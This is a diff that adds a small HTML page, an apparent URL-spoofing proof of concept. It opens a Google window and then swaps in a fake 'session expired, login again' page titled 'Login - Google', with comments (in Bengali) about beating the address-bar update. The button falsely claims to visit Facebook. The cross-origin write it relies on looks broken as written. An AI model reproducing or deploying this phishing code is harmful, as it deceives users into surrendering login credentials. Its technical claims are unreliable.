@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>URL Spoofing PoC</title>
+</head>
+<body>
+    <button onclick="spoof()">Click to visit Facebook</button>
+
+    <script>
+        function spoof() {
+            // একটি নতুন উইন্ডো খোলা
+            var win = window.open("https://www.google.com", "_blank", "width=500,height=500");
+            
+            // খুব দ্রুত কন্টেন্ট পরিবর্তন করা যেন অ্যাড্রেস বার আপডেট হতে না পারে
+            setTimeout(function() {
+                win.document.body.innerHTML = "<h1>This is a Fake Site!</h1><p>Your session expired, login again.</p>";
+                win.document.title = "Login - Google";
+            }, 100);
+        }
+    </script>
+</body>
+</html>
